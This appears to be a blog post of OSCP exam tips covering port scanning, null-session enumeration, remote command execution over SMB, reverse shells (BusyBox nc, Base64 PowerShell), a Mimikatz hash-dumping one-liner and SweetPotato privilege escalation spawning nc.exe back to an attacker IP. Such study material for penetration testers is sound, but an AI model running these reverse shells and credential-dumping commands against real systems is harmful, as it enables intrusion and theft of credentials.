@@ -1,0 +1,79 @@
+Nmap
+
+My default Nmap, which I run on every host I encounter, is
+
+sudo nmap -v -p- -sC -sV 10.10.10.10
+
+Sure, Rustscan is much faster, but I actually had problems where it missed some ports. The -v causes the output to appear as soon as something is found, so I can start working on some of the ports it has found while it is still scanning. So not much time lost here. Also “slow and steady wins the race”.
+
+Afterwards I always do a
+
+sudo nmap -sU 10.10.10.10
+
+It’s rare to see vulnerable UDP ports, so people often don’t even think about scanning them. Just do it. There are times when you will find port 161 open and you will be glad you scanned it and not wasted hours on the non-vulnerable TCP ports.
+Check every open port
+
+Now you have a list of all the ports open on the target… and yes, web ports are usually where the vulnerability is. But not always, sometimes web ports are just a rabbit hole.
+
+If you see other ports open, always check them. Always check if anonymous or null sessions are possible on any port that has authentication. This includes FTP, SMB, RDP, LDAP, etc.
+
+For the “Windows protocols” I like to use NetExec to check this. For example
+
+nxc smb 10.10.10.10 -u '' -p '' --shares
+nxc smb 10.10.10.10 -u '' -p '' --users
+nxc ldap 10.10.10.10 -u '' -p '' -M get-desc-users
+nxc ldap 10.10.10.10 -u '' -p '' --password-not-required --admin-count --users --groups
+... etc
+
+Also, speaking of which… The course still teaches the use of CrackMapExec. This is deprecated. Use NetExec. The command arguments are the same.
+NetExec SMB command execution
+
+Talking about NetExec reminds me of an option that is actually great but not often mentioned. In my OSCP journey I have sometimes come across targets where I had credentials and was allowed to connect via SMB, but RDP, WinRM, PsExec etc were all unavailable. Well, with the -X argument, NetExec can somehow run commands over SMB!
+
+$ netexec smb 10.10.10.10 -u Username -p Password -X 'powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AY...AKAApAA=='
+SMB         10.10.10.10   445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:EXAMPLE.com) (signing:True) (SMBv1:False)
+SMB         10.10.10.10   445    DC               [+] EXAMPLE.com\Username:Password (Pwn3d!)
+SMB         10.10.10.10   445    DC               [-] WMIEXEC: Could not retrieve output file, it may have been detected by AV. If it is still failing, try the 'wmi' protocol or another exec method
+
+And boom, you are in!
+Reverse shells
+
+So now you have found an exploit and need to choose a payload for your reverse shell…
+Which one to use
+
+revshells.com is great, and you probably already know that. However, I’ve noticed a lot of people in the hints channel who don’t know which reverse shell to use. It’s often trial and error and often it doesn’t work. The command argument may not be supported on the target (like “nc -e” which very rarely actually works), or may not even be installed. Or you run into problems with quotes in your payload. I’ve got a favourite reverse shell for Linux that has worked for me about 95% of the time, which I rarely see mentioned anywhere else. It is the BusyBox.
+
+busybox nc 10.10.10.10 1234 -e sh
+
+Really, this has worked wonders for me. No quotes, no slashes (though if it does not work I usually try /bin/sh next) and busybox is usually installed on every system I have encountered so far. Great stuff.
+
+Windows is a bit more complicated sometimes, but what works about 80% of the time is the Powershell #3 (Base64) reverse shell. Again, Powershell is available on every system and there are no special characters to cause problems. The main problem with this reverse shell is its length, sometimes it just does not work because the payload is too long. In this case I usually try to load a nc.exe on the target and run it in a manual 2 stage attack.
+
+Mimikatz one-liner
+
+When you get admin rights on a Windows host, one of the first things you usually run is Mimikatz. It is a great tool. The course also teaches you how to run it interactively. However, many times this will not work, for example because you have not been able to get a stable shell. This is where the Mimikatz one-liner comes to the rescue.
+
+.\mimikatz.exe "privilege::debug" "token::elevate" "sekurlsa::msv" "lsadump::sam" "exit"
+
+This will run Mimikatz without interaction and dump all the domain and local hashes. Another tip is to really take the time to look at all the hashes. I have seen so many times where people already had a domain admin hash and just did not notice it because they thought it was just a local admin.
+pspy
+
+pspy has saved my ass a few times in Linux privilege escalation. It is a program that checks for commands being executed on the host. You run it, wait about 2-5 minutes and look at the output. So many times it found scripts running that I had not noticed anywhere else (like crontabs, which I could not read with my current non-privileged user).
+
+Download it here and get the 64bit static linked version.
+Pivoting
+
+The course will teach you how to pivot with Proxychains and Chisel. This is probably not a secret, but learn to use Ligolo. It is so much easier and faster, it is really worth it. I’m not going to put a tutorial in here, there are others out there that are really good.
+Potatoes
+
+Oh boy, as a Linux sysadmin, these things were my bane. I had a folder with about 10 different “Potato” exploits and when I found the “SeImpersonatePrivilege” I just threw them all at the target.
+
+potato yeet
+
+You don’t have to feel my pain, it’s really easy. Use SweetPotato. I used to link a precompiled version here, but Google flagged my whole blog as “hosting malware”, so I can’t do that anymore. But that also seems to explain why there is no compiled binary on Github… I might make a guide on how to compile it in the future.
+
+    Load SweetPotato and nc.exe to the target.
+    Run it with the “-e EfsRpc” argument (e.g. .\SweetPotato.exe -e EfsRpc -p c:\Users\Public\nc.exe -a "10.10.10.10 1234 -e cmd")
+    Profit.
+
+Once I found this, it worked pretty much every time.
